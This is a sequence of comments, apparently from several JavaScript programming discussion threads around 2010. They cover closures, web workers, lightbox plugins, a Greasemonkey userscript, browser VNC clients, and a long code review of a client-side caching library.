(Also posted on the blag) Your example with static local variables exposes i as a public property on the function object. This can be undesirable if you want to encapsulate your logic and prevent outside tampering of i. You can solve this with a closure. function count() { var i = 0; return (count = function count() { return i++; })(); } On the first invocation, count will be changed into a new function that has a private variable i in its function closure scope. If you look at count.toString() after the first invocation you will see that it now contains the following code: function count() { return i++; }
plus Java
Aesthetically, I prefer _es' version, or the following if with is not available: count = (function() { var i=0; return function() { return ++i } })(); Of course, for this specific problem I'd use: function counter(i) { return function() { return i++; } } but that's showing off first class functions, not private variables :-). I wonder what's a compelling example for self-modifying functions ...
&gt;also, why does everyone dog Java so badly? [Yes,](http://www.maximumpc.com/files/u21826/header-MSN-Java.png) [why](http://stuffthathappens.com/blog/wp-content/uploads/2008/07/java-yahoo-toolbar.png) [do](http://www.howtogeek.com/wp-content/uploads/2009/10/3crap.png) [we?](http://www.lehsys.com/wp-content/uploads/2009/10/SunJavaCrapware.jpg)
Anyone care to give us a primer on what exactly a webworker is and how it might be used?
Whenever JavaScript runs, it blocks the DOM, which means you can't drag things, click on buttons, etc. Usually this isn't noticeable because most JavaScript is short and runs quickly. Sometimes though it doesn't, and your browser will appear to freeze because it's trying to finish running the JavaScript. Web workers allow JavaScript to run outside of this, kind of like asking your brother to take your shirts to the cleaner, while you stay home working on something else. The webworker in the same way does a job for you, and once it's done will return the results. 
This demonstrates how the UI (DOM) is blocked when trying to do something in JavaScript, and can be avoided by using Web Workers (use Chrome/Safari): http://apirocks.com/html5/html5.html#slide10
This is my presentation from jQuery Conference 2010: San Francisco: http://bocoup.com/jquery-hive
What browser versions are supported by this?
Thought you might want to know that your presentation is basically unviewable on my laptop because of the javascript... My browser is maximized at 1280x800 and I can't scroll down to see the 1/3rd or so of each slide I'm missing because the javascript keeps snapping it back... I can't even use the scrollbar... 
Yeah but you could rewrite the server component in whatever you want since it's essentially just a proxy. Personally I would prefer a more light weight server with less protocol mangling though. There's no real need for xml to get involved.
You should probably include browser version there.
Event based threading.
Yes.
k-rad!
Firefox works too.
sorry, firefox 3.6.3.
Disable JS or use CTRL- (with View-&gt;Zoom-&gt;[x]Zoom Text Only).
Fix the url and give more info on where exactly you want to put this code...
Sorry about that. Go to the URL and I think it will be pretty clear, if not let me know. I just need a Userscript to load in Greasemonkey.
I still don't get the bars thing...I see varying percentage values, are those supposed to translate to bars??
These progress bars: http://i.imgur.com/aHGo5.png They contain percentages right here: &lt;div class="barContainer"&gt; &lt;div style="width:30.05%;"class="bar"id="ctl00_mainContent_ mpCommendationsRepeater_ctl00_progressBarPanel"&gt; &lt;/div&gt; &lt;/div&gt; Thanks for taking the time to help :)
I'm not entirely certain I understood you correctly, but does this script help? var commendations = { steel: ' 100 cr/xp', bronze: ' 600 cr/xp', silver: ' 1200 cr/xp', gold: ' 2400 cr/xp', onyx: ' 4800 cr/xp' }; Array.forEach(document.getElementsByClassName('progress'), function(bar){ var image = bar.children[0]; var cText = document.createElement('div'); cText.appendChild(document.createTextNode(commendations[image.src.match(/([a-z]+)_sm/).pop()])); bar.insertBefore(cText, image.nextSibling); }); Plus, /r/greasemonkey might have been a better place to post this request.
Well no one had posted there in over a month :P I really don't know any Javascript, but this is a lot more than I had before. I can probably get enough information by Googling to turn this into a working Userscript. Unless you've just got plenty of free time and would like to help more, I'll try going from here. I could probably explain it to you in better detail if you'd like though, enough to where you'd know exactly what to do. But I'm not going to bug you :P Time is money. EDIT: NEVERMIND, I got one from someone else. Thanks for the help though! Would you like an Xbox live code?
Ive got a script that does what you want but i am a greasemonkey newb. Here is the script i have, it works if jquery is installed on the page and i run it manually, but i dont know how to get it to work with greasemonkey: http://userscripts.org/scripts/show/76260
Thanks man! I'm sure if it works in jquery I'll be able to convert it with a little research. Want some Xbox live codes in return? It's all I really have to offer haha.
sure just pm me once you get it working.
Ah i fixed it!! I guess jQuery 1.4.2 doesn't work with greasemonkey, had to use an earlier version. Should work flawless now!!! http://userscripts.org/scripts/show/76260
:D It sure is! Thanks so much! One last tiny thing though haha, could you make it include the total points needed in the output? For example, the first one would say "Total Points: 1442/4800". I think this would be a really simple edit but still have no idea what to do...thanks in advance if you can :P
OK, try reinstalling. I fixed some bugs with the calculations too.
Awesome man! That's perfect. I hope to one day acquire your skill, it would really come in handy. I'll try learning from this script. Thanks so much :D
No worries, message me if there is a bug.
Alright will do. 
Awesome :D Why doesn't this have more upvotes
Funny meeting you here, Rick. :)
Glad that it worked out for you. /r/Greasemonkey is pretty active although most of the newer posts seem to have disappeared since the server issues of late.
Finally, somebody understands me!!! Have an upvote
Because it's not yet standardized...
While this may not be totally unique, I found it pleasantly informative.
That was my sentiments as well.
Some of these snippets are absolutely terrible. Some have good ideas, but the example code is completely wrong (*not to mention some are completely broken*).
You can also do var in_stock = $('input.is_in_stock', '#shopping_cart_items'); Which looks a bit neater and I'd imagine reduces function calls (though I have a feeling jQuery checks for jQuery objects in selectors, still.)
Doesn't work for me: Firefox 3.6 on OSX
Also doesn't work in Firefox (minefield) 3.7a5pre
Is it cool looking? My chromium doesn't support WebGL still apparently (ubuntu nightly)
Seriously, downvotes?
It's very cool-looking :-) Chromium nightly should work, have you put "--enable-webgl" on the command line?
3.6 won't work, you need a nightly build, which is a 3.7 alpha. [Here's some instructions I put together on getting one.](http://learningwebgl.com/blog/?p=11#install-firefox)
Hmmm, that's odd - that's what I'm using, and it works for me. Is it the latest nightly build? What OS are you on? Or maybe it's a graphics card thing?
Yeah... I've been trying every time a WebGL thread pops up on reddit, and can never get it, i've even tried it with a totally fresh user data directory, and the --no-sandbox option, but to no avail... am I missing something? I'm really anxious to write a few WebGL demos, but I can't get it working here, I got it working via firefox on my windows partition, but I do all my work in my linux partition so that doesn't really help :-p
Why can't I just scroll instead? That is really irritating.
Could be your graphics card/driver. It needs to support at least OpenGL 2.0, I think.
Weird, interesting but weird.
The plugin is cool, but the usability of that site sucks. Edit: Rather, that page. The rest of the site is fine.
I think the point of it would be when you want to tell a story that flows through a linear path. Not suitable for everything but I can see how this could be cool on the right project
Agreed. Could definitely use some indicator as to how to continue to the next step
I agree. Actually, this would be fantastic for a webcomic, I think. Maybe a little gimmicky but I really wouldn't mind seeing it used for an artistic site like that. 
While I wouldn't dream of using IE in real life, as a web developer I'm always curious to see what breaks, so I checked the site with IE8. **Epic Fail**. 
Yes! I cried a tear. It's a great ZUI otherwise; totally Raskin-esque
Yeah. I suppose the problem is, at some point, everyone thinks their site is artistic.
Why the downvote? That part irritated the hell out of me. I could imagine having this as an extra feature on a site - like a different form of lightbox that lets you focus on a certain entry (also handy for older people in need of reading glasses) - but in no way this should be the only way to navigate through a page. 
Because it's broken in firefox 3.6 ? The code is unreadable.
Ah. Chrome user here, I didn't see. Could be worse. Reddit's reply button is broken on most pages on Chrome 5 :-P
Also, you can use the modernizr feature detector: www.modernizr.com - it's really quite useful, uses lots of Marks ideas.
Just because a browser doesn't revert an input element to text doesn't mean is supports the element. Opera is the only browser with a date picker, but Chrome will pass that test. Also, I didn't know you could use 'in' with JavaScript. I thought you had to do obj.hasOwnProperty...
Came here to say this exactly. Let a library do this kind of detection. It is much easier to use a function in modernizr like: if (Modernizr.input['multiple']) to check for multi-file input support, as you then are unlikely to have to modify this line as long as you update the modernizr.js file from time to time.
Sure enough. Here's a test page I made for UI support for the new input elements: http://www.miketaylr.com/code/html5-forms-ui-support.html And 'in' is legit.
So you force an invalid value into an input, then check to see if the browser blocked you? Interesting strategy. I wonder what the potential side-effects are...
There shouldn't be side-effects. Just as testing for CSS properties and values shouldn't have side-effects. Unless the specs say something like _"if an invalid value is passed, the conforming UA MUST halt and catch fire"_ the only way this can break is if a UA decides to make shit up. Of course that doesn't guarantee that there won't be any, but that's what you need testing for. It seems like IE9 is going for the standards zealot way for once, so it shouldn't cause any problems this time around.
Shadowbox is one of the best i have found http://www.shadowbox-js.com/. Integrates with libraries or can be stand alone.
you have to pay for a license which is freaking ridiculous for a popup plugin.
Thickbox.
[Fancybox](http://fancybox.net/)! * Can display images, HTML elements, SWF movies, Iframes and also Ajax requests * Customizable through settings and CSS * Groups related items and adds navigation. * If the mouse wheel plugin is included in the page then FancyBox will respond to mouse wheel events as well * Support fancy transitions by using easing plugin * Adds a nice drop shadow under the zoomed item
Ye, we're also very happy with Fancybox. It works great and it also looks better than Lightbox.
&gt; [...] it seems that prototype is conflicting with my jquery stuff [...] The Prototype library conflicts with everything. It modifies build-in objects and it even overwrites build-in already existing functions which its own broken functions. This means that perfectly fine 100% correctly working code may get broken as soon as there is that f-ing library on the page. Avoid. jQuery doesn't do any stupid stuff like that. "Don't modify objects you don't own." - Nicholas C. Zakas And yes, he's right. If you do modify other stuff it becomes a maintenance nightmare. No exceptions.
Glad someone said it.
[Facebox](http://famspam.com/facebox)
No side effects. That's the specced behavior.
This doesn't resemble Lightbox, but it's relevant and cool enough that I thought I'd link to it: http://development.tobypitman.com/slideshow/index3.html Pure CSS slideshow, no JS at all! Downside: it doesn't work in IE (doh).
Fancybox is great but a bit heavy on the ol' HTTP requests/image sizes by default.
This is the one I use and am quite pleased with it, mainly because I can skin it so easily.
I always use [ColorBox](http://colorpowered.com/colorbox/) if I want something fancy. Otherwise I have a super simple version that I built.
Yes. Fancybox is great.
If you only need one (or two, or three) features and can do it with one line of javascript then why include an entire library for your project?
Not jQuery -- but Andrew Bialecki's excellent Lightbox clone is YUI 3-based and doesn't cause conflicts with jQuery: http://yuilibrary.com/gallery/show/lightbox http://ericmiraglia.com/yui/demos/lightbox.php
There should exist more tutorial like this one. For more languages.
How can you become a better Javascript developer by learning only jQuery ? Bullshit
We've been experimenting with different browser based solutions to VNC clients that and Guacamole was one of them. We ended up going with a python based project called noVNC on github http://github.com/kanaka/noVNC which has a much simpler implementation and provided significantly better performance. The proxy server is a true proxy in that the packets to and from the VNC connection are directly sent to/from the browser. In noVNC, the VNC protocol client is implemented in javascript, including the different encoding. In our tests, each guacamole proxy instance would use 100% CPU and about 170MB of memory. Our deployment involves providing VNC access to hundreds of Virtual Machines, noVNC is a much better alternative. It does suffer from some disconnection issues in safar, but it is by far the most promising html5 based VNC client.
it loads on my ipod touch! at .91 fps!!!!
Unrelated question, is anyone aware of a js unix emulator or terminal emulator? Thanks.
Wow, awesome.
THAT IS SO FUCKING COOL. The performance is really good, I have to check the code.
Have you tried playing Zelda? That's all I played but in FF3.6 with a ~3ghz c2d it's laughable to even say it's playable. Cool all the same, but not useful right now. 
I just tried Zelda, it is pretty bad. It could be optimized but at some point most of the optimizations would be aimed at specific JavaScript engines and that would defeat the point. I wonder what the FPS is like running at the SNES resolution.
I played zelda in chromium, seems fine to me.
All the JS files combined are only 270KB. Very impressive.
I couldn't easily get this working in Firefox. I pasted in jQuery because you don't have it included (I take it GreaseKit includes it or something?), but that didn't fix it. Getting a weird generic error that's not easy to diagnose.. "Component not available"... Bummer.
But what am I going to name my new Java SNES emulator?!
Maybe try it in a browser with good javascript performance. Runs at 100% speed for me on a 2.4ghz c2q.
http://uni.xkcd.com/
I don't have it included because it's already on the page (loaded by Reddit). GreaseMonkey takes some extra steps to sandbox its environment from the rest of the page (there's an `unsafeWindow` object, IIRC).
Related: http://matt.west.co.tt/spectrum/jsspeccy/ whoohoo!
Why so small?
&gt; Someone else should improve and maintain it. Ah how I wish software worked like that ;)
Yah, it's gotta be firefox then, poor ff :(. 
There should be some performance improvement with 3.6.4 which should be released at the end of the month.
Facebox looks great. Looking at the code very impressed with how short and simple it is. Fancybox also looks pretty good. Seems a bit more full featured, but also has 3x the amount of code. Shadowbox, seriously? you want me to pay for it. ಠ_ಠ I used thickbox before and it did want I wanted, but was a huge pain to try and extend. Looks like it isn't maintained anymore either.
The title is sorta misleading - Its just JavaScript API for a speech recognition service. 
Why not use jQuery Lightbox? http://leandrovieira.com/projects/jquery/lightbox/
Worth mentioning that there's Flash in there, too.
*nods in agreement*. Are you Michael Thompson? ( I just googled your reddit id) 
feedback appreciated. What are your thoughts on the "future" section? I'm not convinced that helper methods are a good idea; separation of concerns and all that jazz.
&gt; Its just JavaScript API for a speech recognition service. aw :(
Nice try, marketing research company. ;)
I have an interesting use for this that I'm going to try and work into a prototype to see what happens. Instead of using this as a cache to store server data I'm going to try and bastardize it to store client content. Like a queue of user commands executed in offline that can be popped off when an internet connection is detected. Should be a fun project.
Why is creating a new cache `cache()`? Why not `new Cache()`. (Also, note that constructors should be capitalized) A `cache()` function doesn't tell me anything other than something is being cached, unlike a `createCache()`, which is what you want if you're not making a constructor. I looked at your code and it looks like **nothing** is being re-used. DRY. `my` is not public. You should use the prototype of the cache constructor and in your code instead of referencing `my`, reference `this`. For example: var Cache = function () { // private stuff goes here // use `this' to reference your `my' stuff }; Cache.prototype = { // stuff from `my' goes here }; var cache = new Cache(); cache.setStore(arrayStore); // ... More tips: * Use `===` and `!==` instead of `==` and `!=`. * `if (exp!=false &amp;&amp; exp!=null)` can be replaced with `if (exp)`. * Use whitespace. It's much harder for other people to read your code without it. For example, `if (a(b, c) + d)` instead of `if(a(b,c)+d)`. * Don't name your functions, use variables. Variables can be minified, named function declarations cannot. * Arrays should be created with literals (`[]`). * WTF is `arrayStore()`? It looks like you're assigning properties to an array (which you are creating very weirdly, using `Array()` instead of `new Array()`). There's an object type for a reason (and yes, it should be created with literals, `{}`). * Yes, the constructor issue applies to `arrayStore()` too. Heck, it applies to all of your faux-constructors. * Why the heck are you abstracting an object type. `a[str] = b` is not hard to write. I see no reason for this and it will really slow down everything. * Don't use `localStorage` expandos. There's a `Storage` interface which should be used instead. * You've got to be kidding me: `localStorageStore`. The `Storage` interface has all of this, you shouldn't further abstract this functionally, and incorrectly at this. (`removeItem`, `setItem`, etc.) I'd say it'd be best to scrap the whole library and start over. It's quite obvious you have no experience writing JavaScript libraries, so I suggest buying a book on it before releasing a library of your own or at least studying current popular JavaScript libraries like jQuery.
ok. Thanks for your input. I personally don't see any benefit of modifying the prototype. I find that Crockford's module pattern is clear and simple. Yeah, I'll probably capitalise the constructors. I don't see it as a big thing. Whitespace. Your coding style differs from mine. Neither is "correct", it's a matter of taste. The reason I'm abstracting arrayStore and localstorageStore is so they can be swapped out without changing any of the cache object's code. I'll modify the localstorageStore to use the Storage interface. Good point. May I ask why you don't like the expando properties though?
What you're doing is not Crockford's module pattern, otherwise you'd be making modules and not globals faux-constructors. You obviously are using your code as if it was constructors, even though they are not. On globals: Please only make one global object/constructor per library. Do not pollute the global namespace. Secure JS environments (yes, they exist, such as Firefox's chrome environment) can't support expandos and they usually don't even exist, specification-wise. It's just stuff introduced by browser vendors. You still didn't explain why you're using an `array` in `arrayStore` (and why it's called "**array**Store", when it has nothing to do with arrays. Wouldn't `store` make more sense? Actually, store is a very collision-prone variable so it's just another reason to not pollute the global namespace. Also, don't capitalize your constructors if they are not constructors, even if you are using them as constructors, as you are now. Capitalize them if you actually make them constructors, using the prototype, et. al.
&gt; Do not pollute the global namespace. I agree, and did consider putting the stores inside the cache object, but that didn't sound right from a design perspective. The great thing about javascript is that you can move things about to suit your own architecture, if you're at the point where polluting the global namespace is a real issue. &gt; Secure JS environments ... can't support expandos Right, thanks. &gt; it has nothing to do with arrays I don't follow you. It stores data in an array...? But I don't really want to get into a point-by-point argument about this. I will very likely take on board what you're saying about constructors, using new etc. The rest of your comments seem like you're picking up on pretty unimportant stylistic issues (cache() vs createCache()? How about $() for semantic code then?). Please remember this is the first version, it's bound to go through several more iterations before it's as polished as the established libraries out there. edit: the bottom line for us is that it's reducing server load and improving user experience, and that's great. We can fine tune the details as we go along. In fact that's why we open sourced it! :)
[dojo.storage](http://en.wikipedia.org/wiki/Dojo_Toolkit#Client-side_data_storage) (Started 2006) [PersistJS](http://www.reddit.com/comments/6kd4i/persistjs_cross_browser_clientside_persistent) (Started 2008) [jStore for jQuery](http://code.google.com/p/jquery-jstore/) (Started 2009) [In fact there's a whole list of existing plugins to do this](http://plugins.jquery.com/taxonomy/term/1589) [Good article from 10 May 2010 about the current state of persistent client-side JS storage](http://rethink.unspace.ca/2010/5/10/the-state-of-html5-local-data-storage) Perhaps your efforts would be better put towards an existing localStorage framework. jStore for jQuery seems to be the most active of the above list. *(I am not affiliated with any of these projects.)* It would be good experience and more efficient for everyone involved. Unfortunately since you are late to the party I don't see any reason to choose Cachejs over existing projects which have wider userbases.
heh, yeah we did know we were re-inventing the wheel a bit. However, one of the advantages we see is in the fact we've abstracted the actual storage mechanism out from the cache, so if the localstorage API changes, or if a new fancy way of persisting data is invented, you can seamlessly move over to that, just by implementing a new store. You're absolutely correct though; a more established library will very likely be a better choice for someone wishing to just "plug and play" :)
&gt; It stores data in an array...? No, it stores it in an object. We're talking about JavaScript here. **Arrays are lists of items**; nothing more, nothing less. Everything is an object, but that doesn't mean you should use anything for an object when you can use an object. The way you're using it, nothing is stored in the array. The only thing that's happening is that you're assigning properties to the array object. I'm not talking about semantic code, I'm talking about performance-wise for your pattern, as you're pretending it's a constructor and saying `my` is public (though it technically is, but not in the sense you are thinking of - don't want to discuss this). Your code has no inheritance. Use prototype if you're going to treat stuff like constructors (`instance = [new ]Constructor()`). Best-practice-wise, you should either use inheritance and keep your instantiation code (adding `new` to it though) or keep your current code and put the word "create" before everything, as they are not constructors, just functions returning similar objects. Heck, technically create methods are just supposed to be proxies to constructors (as it is in the DOM), so in the end, you should always use real constructors instead of fake ones, as they waste memory.
&gt; No, it stores it in an object. and what is the name of that object? (edit: internally, the arrayStore object stores its data in a native Array object. That's why it's called an arrayStore. Because it uses Array to store stuff.) &gt; or keep your current code and put the word "create" before everything, as they are not constructors and that would be OK with you? so your main objection boils down to me not called it *create*Cache? I think you're reading way too much into the names here.
No, my main objection is that you're pretending that it's a constructor when it's not. You can easily reap memory benefits from making it a constructor as then all instances would actually inherit the `my` object as `this. If you don't want to reap these benefits, you should give it a name which is appropriate for non-constructors, such as the technically wrong, yet less wrong than currently being used, 'create' prefix. &gt; edit: the bottom line for us is that it's reducing server load and improving user experience, and that's great. We can fine tune the details as we go along. In fact that's why we open sourced it! :) Variable name length doesn't matter in the end, as any reasonable person minifies their JavaScript before sending it over the wire. **Edit**: On `arrayStore`: There's no reason that you should be using an array. You're not storing a list of items. Use `{}` instead of `new Array` (actually, you don't even use "new" in this case, which is incorrect instantiation of an array). It's like using a `Number` instance to store properties; there's no reason.
&gt; You can easily reap memory benefits from making it a constructor as then all instances would actually inherit the my object as `this. yes indeed - as I said above, I'll very likely be changing over to this pattern. &gt; Variable name length doesn't matter in the end, as any reasonable person minifies their JavaScript before sending it over the wire. I must be on stupid mode today. What does that have to do with the fact that cachejs has been deployed and measurably reduced our server's load by caching frequently requested data?
&gt; I must be on stupid mode today. What does that have to do with the fact that cachejs has been deployed and measurably reduced our server's load by caching frequently requested data? Oh, I thought you were arguing about how `createCache` is longer then `cache`. Sorry :P. Also, see my edit.
:) right. &gt; There's no reason that you should be using an array. You're not storing a list of items no, but I am storing a group of items. They don't need to be iterable, but why not? And it does what it says on the tin! You could write an objectStore which doesn't use an array, and plug it into the cache object instead of arrayStore. That's fine. &gt; you don't even use "new" in this case, which is incorrect instantiation of an array Yes, I really didn't think that hard about that part. I'll move over to using literals as it is better practice.
Please understand that you _shouldn't_ use an array for anything but array stuff, which is a linear list of items. Grouping is what pure objects are for (`{a:{b:1,c:2}`, etc.). Please note that you don't even need to use a private object if you use instantiation of constructors, as the prototype methods can act on the instance object itself. Another thing about prototypical inheritance: Prototypes can't access privates (all **var**iables in JavaScript are private to function scope, except global variables). You should solve this problem by using public properties which can be set in the constructor functions.
&gt; Someone else should improve and maintain it. Someone should make me a sandwich! 
**Javascript 101:** var a = {}; This is an empty object. JS objects are not like Java's but rather like PHP arrays, but since it's Javascript the properties can also be functions. a.foo = 'bar' a.bar = function() { return 'foo'; } The common way to assign a value to an object's property. This is completely equal to writing: a['foo'] = 'bar' a['bar'] = function() { return 'foo'; } **these two are the same damn thing** So instead of using a = new Array() which is [not what you really wanted to use](http://www.w3schools.com/js/js_obj_array.asp) you should have written a = {} or even a = { something: 'somevalue', else: 'bla' } next up: [learn how to correctly use a constructor](http://www.javascriptkit.com/javatutors/oopjs2.shtml)
Why not use the built-in browser cache? You know, using HTTP headers and whatnot
I have to make the same point as someone else has. Javascript Arrays are not Javascript Objects. I'm not sure if you're using PHP server side, which has Arrays that act like Hashes, but Javascript doesn't work that way. Well, it will, but it's only because its has to play nice with bad code. Arrays contain data like: var arr = [ 'item number one', 'item number 2', 'item number 3' ] To pull data out of an Array you should only reference its index, arr[0] = 'item number one' and so on. Objects contain data like: var obj = { item1: 'one', item2: 'two', item3: 'three' } To pull data out of an Object you should reference its name, obj.item1. This is why you should rename arrayStore, objectStore instead and change var myStore = Array(); to var myStore = {}; Theres also a bunch of other logic that could be simplified. If you put your code on [GitHub](http://github.com) or [BitBucket](http://bitbucket.org) (depending on what version control system you prefer), I'm sure many people would be glad to fork and improve your code.
Just like everything in JS, Arrays are Objects ([] instanceof Object). Furthermore, an object (literal) is simply an Associative Array. And lastly, there is nothing invalid in the following: var arr = ['item one', 'item two', '...']; arr['item1'] = 'one'; arr.item2 = 'two'; And so forth.
I've always been a fan of pretty photo: http://www.no-margin-for-errors.com/projects/prettyphoto-jquery-lightbox-clone/
&gt; I have to make the same point as someone else has if you like, but I've already replied to Sephr and agreed that I'm going to change the way the arrayStore works, so your comment really is quite redundant. &gt; If you put your code on GitHub or BitBucket What's wrong with google code, just out of interest?
&gt; Javascript 101 ... these two are the same damn thing I don't see how that's relevant to the comment you're replying to, or to the code. You're just saying some basic stuff about arrays, I don't follow. You're also making the same points that I've already responded to.
&gt; Don't name your functions, use variables. Variables can be minified, named function declarations cannot. That's not true.
Not without changing your code. Named functions have a `name` property which might be used by code. Minifiers can't risk this and assigning the named functions to variables might cause problems too.
The 'name' property of a function is non-standard. Only Gecko and Webkit support it.
That's true. There's even a funky bug regarding that which I recently discovered. But naming your functions can still have a use: the name of a function, even inline declared, can be used to identify said function within the function body. You could argue you should use arguments.callee, which I'd do too, but I think I heard something about one of the new JavaScript versions doing away with that arguments property, something to do with security, so naming inline functions to allow for recursion was promoted instead. Although naming inline functions with IE is a bit of an oddity, because naming an inline function creates a local variable holding a copy of that function... Yes, it's not the same one. It also won't overwrite an existing local variable with that name, but it will shadow those higher up in the scope.
because then we still need to do the http request, we'll just get a 301 response and the browser will pull the data from its cache. But caching client-side means we can skip out that roundtrip. I'm not even sure if xmlhttprequest respects cache headers? This blog post offers some insights into [browser caching](http://www.mnot.net/blog/2006/05/11/browser_caching), though it's from 2006.
I understand everything is an object and you can treat it that way, but its generally frowned upon to mix an Object into an Array like that.
Sorry it was quite late and I thought I followed all the way down the comment thread, apparently I did not. My bad. Well Google Code is nice, but I find GitHub and BitBucket offer a few extra features (including a source control thats better than SVN, which to be honest is rather rubbish when it comes to distributed source control), and its also much easier to fork your own version of peoples code along with contributing back into the main repository.
We deliberated over github vs google code but couldn't find a compelling reason to go with github over google code, and with the knowledge that github only have limited free features we didn't want to end up 2 years down the line having to upgrade to a "premium" account. I still want to try github out so maybe we'll put future projects on there. Or I might just release my own stuff on github in future. Cheers.
That doesn't make it not exist. Just because something isn't in ECMAScript doesn't mean it's part of JavaScript (the language maintained by Mozilla, not the ECMAScript synonym) and should be ignored.
I think that most minifiers ignore its existence. Which minifiers won't minify named functions? I know that packer will (I'm the author). I've never had a bug report regarding the name property of a function. Even if I did I would tell the reporter that the benefits of minifying named functions outweigh the benefits of using non-standard properties.
No problem. I just noticed Google Code offers Mercurial access to the source, might want to experiment with that, Mercurial (and Git) is tonnes better for version control, especially if theres more than one person working on it.
again, we looked at mercurial but decided as this was probably not going to turn into a large project that it wouldn't offer a significant advantage over SVN. Thanks again though, we'll certainly reconsider all these things in the future.
Can you please let me know why you recommend using === and !== instead of == and !=? I usually don't care about the type of the variables I'm comparing and don't see the need on using strict comparisons. Is it bad practice to do so, or are there any performance issues I should be aware of? Also, is there any reason to use variables rather than named functions other than minifying? And While I'm at it, is there any reason to minify other than saving space? Thanks!
It's mostly a best practice but it does also increase performance ever so slightly. Also, your usage of `==/!= null` is bad as it wouldn't actually work (in most cases, localStorage sometimes excluded because non-existant keys are null) so you should test for item presense with the `in` operator or *at least* doing `typeof object.property !== "undefined"`.
/packer/ &lt;= 3.0 is one minifier that doesn't minify named functions. One minifier that really intrudes is YUI compressor, as it minifies function names even in named function expressions assigned to variables.
I think where we are not seeing eye-to-eye is that "Object" is too general, where we are both referring to Object Literals (Notation) or Associative Arrays. I wouldn't necessarily say anything in JS is absolutely frowned upon; just like attaching properties to a function (var foo = function(){}; foo.bar = 'blah';), there are likely cases for attaching associative indices to an "Array." Perhaps not in the OP's case, I regret not having read their source, as the project is already very well solved, elsewhere.
Ha! I was wrong about my own minifier. :) Packer 3.1 minifies named functions but packer 3.0 does not. I think that packer 3.1 is better in that regard. I think it is important that minifiers shrink the names of named functions. ES5 in strict mode prohibits the use of arguments.callee. Using named functions is one way round that.
There is literally one feature we don't offer on the free plan compared to the paid plans. We treat open source as first-class citizens on github.
To write such JavaScript, one must already be insane.
I like this. jQuery should be built into all browsers.
That would have the following effects: * Browser implementers start influencing the development of jQuery itself * The development of jQuery becomes bound to the development cycles of 4 different browsers which all have widely different cycles, fucking up any and all chance of inter-browser compatibility forever and requiring a new hQuery layer smoothing over the differences. Stupid idea.
zQuery ftw
I don't think the entire library should be native, per-se -- only the critical areas that are most expensive. You can already see this happening with new functions like [querySelector](https://developer.mozilla.org/en/DOM/document.querySelector), which does a jQuery-like DOM query. Due to the nature of cross-browser JavaScript, a lot of environment inspection is an unavoidable step in determining what workarounds are necessary. I think a reasonable approach is to provide enough native code that, in the right browsers, jQuery becomes a skeleton around fast native abilities. This has two huge benefits: * If you don't like jQuery, you can use *insert favorite library here* and have its core functionality run at equivalent speed. * Since native enhancements will be part of the compatibility/feature detection of the library, all of the JS/workaround code will still apply with minimal modification and provide compatibility for older browsers.
"Native" means native in the sense that the current jQuery code would be permanently cached in the browsers. This code would be inserted into any site which currently points to Google's hosted javascript libraries. This would require no changes on the part of websites, has no chance of risking incompatibility and is not a groundbreaking proposal, just a way of speeding up load times of sites. 
I'm sure it's wonderful! Really, we pretty much couldn't decide. In fact I had initially suggested we use github over google code.
What's really so terrible about caching from google's hosted javascript libraries? Is this really a problem, what would be the real gain besides publicity for jQuery?
&gt; You can already see this happening with new functions like querySelector, which does a jQuery-like DOM query. It would be far more exact to say that jQuery does a querySelector-like DOM query. Also, querySelector returns a single element, jQuery's behavior is closer to that of [querySelectorAll](https://developer.mozilla.org/En/DOM/Element.querySelectorAll). Furthermore there were several libs long predating either, such as Dean Edwards's cssQuery or Simon Willison's getElementsBySelector (from 2003). Finally, as far as the API actually goes, querySelector[All] most replicates Internet Explorer's SelectSingleNode and SelectNodes methods (using CSS instead of XPath) &gt; I think a reasonable approach is to provide enough native code that, in the right browsers, jQuery becomes a skeleton around fast native abilities. But the thing is *this is already happening, and it's been happening for more than 5 years now, there is no reason to add jQuery to the browsers to have that*
Or you could use variables...
&gt; It would be far more exact to say that jQuery does a querySelector-like DOM query. Definitely. I won't argue that jQuery invented the concept of a CSS selector DOM query, or that querySelector was solely based off jQuery -- only that it was an example of a big chunk of work done typically by JS libraries that can now be absorbed back into native code. &gt;But the thing is this is already happening, and it's been happening for more than 5 years now, there is no reason to add jQuery to the browsers to have that Not sure I understand you here, but I think we're saying the same thing. I think more of the functionality that has been deemed useful by the JS libraries should be implemented in a fast native way by the browsers, so that the JS libraries can use those functions to perform better.
As I said: it does what I need it to do. I don't actually need any of the features I mentioned. Or, in other words: "I'm not using these sandwich ingredients anymore. Feel free to use them to make your own sandwich if you so desire."
yeah, and who needs functions that just return 42 or 4711 anyway?
agreed on all but one accounts; arguments.callee is NOT deprecated 
thanks, I edited the post
Can you help me out here - I'm trying to fix some of the code as per your suggestions. I would expect: * the constructor to be able to access public and private * public to be able to access public and private * private to be able to access public and private * outside code to be able to access public and constructor This is not possible in the code snippet you posted; can you point me to a pattern that allows this?
I thought that it was removed in ES5?
This is brilliant! The way to de-anonymize your functions is not to make them anonymous in the first place! Why has no one thought of this before?
In JavaScript, inherited public fields and methods cannot access private constructor function scope. Instead of using privates, share them as properties of 'this' that the public inherited methods would have access to.
... but then they're not private. That defeats the purpose of separating public and private methods.
Sorry, but that's just how JavaScript is. Inherited public can have no interaction with private, though non-inherited public can on the other hand, but then you might as well use all private, as it'd be equivalent and faster. Here's some example code as to what you may want to do. var Foo = function (b) { this.x = {a: b}; // this is non-inherited and public var x = this.x; // this is a private reference to a public property }; Foo.prototype.bar = function () { // this is inherited and public // cannot access anything private return this.x.a; // returns 1 for (new Foo(1)) };
ok, I understand. Thanks for your help :)
looks like curry to me
The point (which the author didn't even mention) is that the "var" creates an enclosing scope so the name "countToTen" is not visible anywhere else in the program.
No. It's removed in strict mode.
var does not introduce a new scope. JavaScript only has function scope and global scope. var i = 0; for (var i = 0; i &lt; 10; ++i); require('sys').puts(i); // =&gt; 10 If you use js2-mode in Emacs (which parses JS properly) the 2nd var will be underlined and the message will say something about redefining i. edit: [nice article on function scope](http://pierrespring.com/2010/05/20/my-variable-declaration-got-hoisted/)
Yes, that's the end result, but your explanation wasn't quite right. The `var` doesn't *create* an enclosing scope. Instead it creates `f1()`, `f2()` and so on as local (lexically scoped) symbols *within* the current function scope (or global scope if the definitions don't appear inside a function). In other words, `f3()` is only visible inside `f2()`, and `f2()` is only visible inside `f1()`. 
